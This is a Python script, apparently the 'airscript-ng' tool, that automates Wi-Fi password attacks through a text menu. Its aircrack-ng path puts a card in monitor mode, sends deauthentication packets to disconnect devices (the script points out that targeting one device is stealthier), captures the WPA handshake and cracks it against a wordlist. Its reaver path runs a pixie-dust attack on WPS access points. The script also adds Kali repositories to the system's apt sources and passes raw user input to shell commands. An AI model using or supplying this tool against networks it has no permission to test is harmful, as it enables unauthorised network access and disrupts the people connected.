#!/usr/bin/python3
def depandancies():
    import os,time
    print("[-]Updating system and installing some dependancies. Please hold!")
    os.system("sudo apt-get update > log.txt && sudo apt-get install apt -y > log.txt && sudo apt install xterm -y > log.txt")
    os.system("xterm $HOLD -title 'Installing any dependancies [aircrack-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e sudo apt install gawk reaver aircrack-ng wireless-tools ethtool -y")
    time.sleep(2)
def check_depends():
    import os,time
    array = ["xterm","gawk","reaver","aircrack-ng","wireless-tools","ethtool"]
    for i in array[0:len(array)]:
        x = os.system("dpkg -l %s | awk -F ' ' {'print $2'} | grep -i '%s' >> log.txt" %(i,i))
        if x == 0:
            pass
        else:
            depandancies()            
def clearScreen():
    import os
    if input("[i]Press 'y' to perform cleanup! >>").lower().startswith("y"):
        print("\n[info]Wait a few seconds, cleaning up...")
        os.system("airmon-ng stop wlan1mon >> log.txt;echo 'almost done';airmon-ng stop wlan0mon >> log.txt")
        os.system("clear")
        if input("\n[-]Press [y] to exit or any other key to return to start>>").lower().startswith("y"):
            os.system("rm log.txt")
            os._exit(1)
        else:
            os.system("clear")
            title()
            os.system("rm log.txt")
    else:
        clearScreen()
def revert():
    import os
    if os.system("ls -a backup-repos >> log.txt") == 0:
        os.system("sudo cp backup-repos/sources.list /etc/apt/sources.list")
        print("Successfully reverted repo back to what it was!")
        os.system("sudo apt update")
        print("If you don't see errors above then SOURCES file is ok.")
        clearScreen()
    else:
        print("Backup file not found!")
        clearScreen()
def install_deps():
    import os
    os.system("clear")
    print("[+]This option will append a few lines to your '/etc/apt/sources.list' file.")
    print("[info]After this the program will update the apt repos and install the dependancies")
    print("[-] Please, Please remember that adding additional repos to debian is not advised.Since we'll only be adding the Kali-Rolling Repos, You should be fine! Do not run this on a KALI system!")
    tf = input("[?]Press [y] to proceed or CTRL+C to exit. >>")
    if tf.lower().startswith("y"):
        os.system("airmon-ng stop wlan1mon >> log.txt;echo 'almost done';airmon-ng stop wlan0mon >> log.txt")
        if os.system("ls -a /etc/apt/sources.list >> log.txt") == 0:
            if os.system("ls -a backup-repos >> log.txt") !=0:   
                os.system("sudo mkdir backup-repos;cd backup-repos;cp /etc/apt/sources.list ./")
                com = os.system("sudo echo '#This line was added by airscript-ng, remove the line below if problems occur' >> /etc/apt/sources.list") 
                sou = os.system("sudo echo 'deb https://http.kali.org/kali kali-rolling main non-free contrib' >> /etc/apt/sources.list") 
                if com == 0 and sou == 0:
                    print("[+]APT sources successfully added. If any problems occur remove last line from '/etc/apt/sources.list' file.")
                    depandancies()
                    print("Dependancies successfully installed! If you see errors above remove last line from '/etc/apt/sources.list' file.")
                    clearScreen()
                else:
                    print("Problems occured when trying to add the repos, reverting to old repo.")
                    if input("Revert? y/n >>").lower().startswith("y"):
                        revert()
                    else:
                        clearScreen()
            else:
                print("Looks like Kali-repos have already been added.")
                depandancies()
        else:
            print("Are you sure this is a debian-based system?")
            print("I didn't find anything for '/etc/apt/sources.list'")
            print("Either your system doesn't use APT or isn't a debian based distro.")
            print("Please try something else.")
            clearScreen()
    else:
        install_deps()
def reaver():
    import os, time
    try:
        os.system('clear')
        print("[+]Thanks for chossing reaver")
        print("[-]Please note that Reaver-pixie dust method only works on very few WPS access points worldwide. This number is dwindlling and success chances are very low. That doesn't mean its all 'Doom and Gloom' ")
        print("[+]Despite the odds, when it works, it feels magical. Like the powers above sprinkled some pixie dust on your computer.")
        ack = input("[?]Type 'y' to continue>>")
        if ack.lower().startswith('y'):
            print("[-]Checking for dependancies")
            check_depends()
            print("[-]All dependancies are met ma dude. Make sure you have correct drivers!")
            time.sleep(2)
            os.system('clear')
            print("""

██████╗ ██╗██╗  ██╗██╗███████╗    ██████╗ ██╗   ██╗███████╗████████╗
██╔══██╗██║╚██╗██╔╝██║██╔════╝    ██╔══██╗██║   ██║██╔════╝╚══██╔══╝
██████╔╝██║ ╚███╔╝ ██║█████╗      ██║  ██║██║   ██║███████╗   ██║   
██╔═══╝ ██║ ██╔██╗ ██║██╔══╝      ██║  ██║██║   ██║╚════██║   ██║   
██║     ██║██╔╝ ██╗██║███████╗    ██████╔╝╚██████╔╝███████║   ██║   
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   


[info]Developed by Sh3llCod3, Using the reaver tool. 2017-2020. Use with legal caution, disclaimer applies.Thanks for using this program\n""")
            print("Ok lets put a Card in monitor mode\n")
            print("[+]your cards are:\n ")
            os.system("airmon-ng | grep -i 'wlan*' | cut -d' ' -f 1 | awk -F ' ' {'print $2'}")
            print("\n")
            index = input("[?]What card shall I put in monitor mode? wlan0 [enter 0] wlan1 [enter 1] etc >>")
            query = ("wlan"+"%s" %(index))
            query = str(query)
            os.system("airmon-ng start %s >> log.txt" %(query))
            os.system('clear')
            print("[info]Ok, seems like %s is started, time to get crackin'" %(query))
            print("[info]Now we'll run wash to find all the wps networks around")
            print("[info]Please press CTRL+C once you see your target network")
            z = input("\nGot all that? Press enter >>")
            z = str(z)
            os.system("wash -i %smon" %(query))
            b = input("\n[?] Just copy+paste the bssid of the target network [no spaces]>>")
            b = str(b)
            c = input("[?]Finally tell me the channel of the target ap [look for Ch] >>")
            c = str(c)
            os.system("clear")
            print("[info]Once you hit enter i'll attempt to pwn the wps using Reaver + Pixie dust.")
            print("[info] Please note that this can backfire and lock the AP if left for too long")
            print("[info]It should work in 15secs~30secs. If you see it running for more, then cancel it with CTRL+C.Don't risk it.Try again.")
            d = input("\nPlease press enter to continue or CTRL+C to exit now >>")
            os.system("reaver -i %smon -b %s -K 1 -vvv -c %s" %(query,b,c))
            print("\n[info]By now it has either worked or not. If it hasn't, well then i'm sorry. Please use the aircrack-ng approach instead or if it has then CONGRATS ON FINDING THE PSK!")        
            clearScreen()
        else:
            os.system('clear')
            reaver()
    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
            print("\n[info]Wait a few seconds, cleaning up...")
            os.system("airmon-ng stop wlan1mon >> log.txt;echo 'almost done';airmon-ng stop wlan0mon >> log.txt")
            os.system("clear")
            if input("\n[-]Press [y] to exit or any other key to return to start>>").lower().startswith("y"):
                os.system("rm log.txt")
                os._exit(1)
            else:
                os.system("clear")
                title()
                os.system("rm log.txt")
def aircrackng():
    import os,time
    print("[-]Checking for dependancies")
    check_depends()
    print("[-]All dependancies are met ma dude. Make sure you have correct drivers!")
    time.sleep(2)		
    os.system("clear")
    while True:
        try:
            def mainScreen():                
                print ("""
    \n

 █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗     ███╗   ██╗ ██████╗ 
██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝     ████╗  ██║██╔════╝ 
███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝█████╗██╔██╗ ██║██║  ███╗
██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗╚════╝██║╚██╗██║██║   ██║
██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗     ██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚═╝  ╚═══╝ ╚═════╝ 


[info]Developed by Sh3llCod3, Using the Aircrack-ng tool. 2017-2020. Use with legal caution, disclaimer applies.                                                                                  
    """)
                os.system("echo 'Starting...'")
                os.system("airmon-ng stop wlan1mon > log.txt && airmon-ng stop wlan0mon >> log.txt")
                print("\nHi, welcome to aircrack-ng made easy")
                print("Please read everything that appears at the bottom")
                print("Thanks for using this program")
                print("\n[+] your cards are: \n")
                os.system("airmon-ng | grep -i 'wlan*' | cut -d' ' -f 1 | awk -F ' ' {'print $2'}")
                print("\n")
                index = input("[?]What card shall I put in monitor mode? wlan0 [enter 0] wlan1 [enter 1] etc >>")
                query = ("wlan"+"%s" %(index))
                query = str(query)
                os.system("airmon-ng start %s >> log.txt" %(query))
                print("[info]1) Ok, seems like %s is started, time to get crackin'" %(query))
                print("[info] 2) now, we'll run Airodump-ng to capture the handshake")
                input("[info] 3) once you start airodump, you need to press ctrl+c when you see your target network. \n\n[?] press enter to continue >>")
                os.system("airodump-ng -a %smon" %(query)) 
                print("Ok, all I need is a few things from you")
                b = input("[?]First, we'll create a new file to store the key in. What shall I call it? [no spaces]>>")
                b = str(b)
                c = input("[?] Now, tell me the (copy/paste) channel {look at CH column} of the network [no spaces]>>")
                c = str(c)
                d = input("[?]Finally tell me the (copy/paste) bssid of the network [no spaces]>>")
                d = str(d)
                if b and c and d != "":
                    print("[info]Now, the idea is when someone connects/reconnects, we grab the password")
                    print("[info] That's why we need to disconnect someone. You dont have to, you can wait for someone to connect or connect manually")
                    print("[info]You can leave it blank to not disconnect anyone")
                    e = input("\n[?]How many de-auths/disconnects shall I send? Don't use '0'! >>")
                    e = str(e)
                    print("[info] Look at the second column where it says bssid/station.")
                    print("[info]In simple terms the bssid is the wifi access point and the station is a devices connected to that network.")
                    print("[info]You can copy/paste a station address to de-auth/disconnect a specific device rather than all devices on the network")
                    print("[info]This is a more stealthy as only one device is being disconnected.")
                    print("[info]please ensure that the station (address) you copy/paste is connected to the the bssid you copied earlier [Look in the bssid column]")
                    print("It is optional but you can also leave this blank if you still don't get it")
                    g = input("\n[?]Please copy/paste station (address) here or leave blank>>")
                    g = str(g)
                    if e != "" and g != "":
                        input("\n[?]PRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! [press enter]>>" %(d))
                        os.system("iwconfig %smon channel %s" %(query,c))
                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s -c %s %smon;airodump-ng -w %s -c %s --bssid %s %smon" %(e,d,g,query,b,c,d,query))
                        print("[info]If you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
                        print("[info]First make sure you have a wordlist which has the password in it ")
                        print("[info]Once you download or locate one press enter")
                        print("[info]Hopefully the password will be in there or put it in there")
                        f = input("\n\n[+]Drag the wordlist on the terminal, literally!! use the file manager! >>")
                        f = str(f)
                        print("[info]Ok, ready? press enter to start cracking")
                        print("[info]If nothing is found after a while then ctrl+c and try again with a different wordlist")
                        input("[press enter]>>")
                        os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
                        print("\n\n[+]LOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN SOMEWHERE!")
                        print("[+]CONGRATS IF YOU FIND THE PSK!")
                        clearScreen()
                    elif e != "" and g == "":
                        input("\n[?]PRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! \n[press enter]>>" %(d))
                        os.system("iwconfig %smon channel %s" %(query,c))
                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s %smon;airodump-ng -w %s -c %s --bssid %s %smon" %(e,d,query,b,c,d,query))
                        print("\n[info]If you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
                        print("[info]First make sure you have a wordlist which has the password in it ")
                        print("[info]Once you download or locate one press enter")
                        print("[info] Hopefully the password will be in there or put it in there")
                        f = input("\n[+]Drag the wordlist on the terminal, literally!! use the file manager! >>")
                        f = str(f)
                        print("[info] Ok, ready? press enter to start cracking")
                        print("[info]If nothing is found then ctrl+c and try again")
                        input("[press enter]>>")
                        os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
                        print("\n\n[+]LOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN SOMEWHERE!")
                        print("[+]CONGRATS IF YOU FIND THE PSK!")
                        clearScreen()					
                    else:
                        print("[info] Ok, you have chosen not to disconnect anyone.")
                        print("[info]You need to wait for someone to connect or connect manually yourself")
                        input("[info]Ready? Hit enter to run. When you see WPA HANDSHAKE:%s at the top right press ctrl+c>>" %(d))
                        os.system("\niwconfig %smon channel %s" %(query,c))
                        os.system("\nairodump-ng -w %s -c %s --bssid %s %smon" %(b,c,d,query))
                        print("\n[info]If you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
                        print("[info]First make sure you have a wordlist which has the password in it ")
                        print("[info]Once you download or locate one press enter")
                        print("[info]Hopefully the password will be in there or put it in there")
                        f = input("\n[+]Drag the wordlist on the terminal, literally!! use the file manager! >>")
                        f = str(f)
                        print("[info]Ok, ready? press enter to start cracking")
                        print("[info]If nothing is found then ctrl+c and try again")
                        input("[press enter]>>")
                        os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
                        print("\n\n[+]LOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN!")
                        print("[+]CONGRATS IF YOU FIND THE PSK!")
                        clearScreen()
                else:
                    input("[-]You missed something, try again, \n[press enter]>>")
                    mainScreen()
            mainScreen()
        except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
            print("\n[info]Wait a few seconds, cleaning up...")
            os.system("airmon-ng stop wlan1mon >> log.txt;echo 'almost done';airmon-ng stop wlan0mon >> log.txt")
            os.system("clear")
            if input("\n[-]Press [y] to exit or any other key to return to start>>").lower().startswith("y"):
                os.system("rm log.txt")
                os._exit(1)
            else:
                os.system("clear")
                title()
                os.system("rm log.txt")
def title():
    try:
        import os
        os.system('clear')
        print("[?]What tool would you like to use? Please run as root or after 'sudo su'")
        print("Type [1] - Aircrack-ng to crack WPA/WPA2")
        print("Type [2] - Reaver with pixie dust to crack WPS (rare vulnerability)")
        print("Type [3] - Add the Kali-Rolling Sources and install any dependancies")
        print("Type [4] - If you used option [3] and APT broke, use this to fix it")
        selection = input("Press 1, 2, 3 or 4 >>")
        if selection == "1":
            aircrackng()
        elif selection == "2":
            reaver()
        elif selection == "3":
            install_deps()
        elif selection == "4":
            revert()
        else: 
            os.system('clear')
            title()
    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
        print("\n")
        log = os.system("ls -a | grep -i 'log.txt' >> log.txt")
        if log == 0:
            os.system("rm log.txt")
        else:
            pass
        os._exit(1)
title()
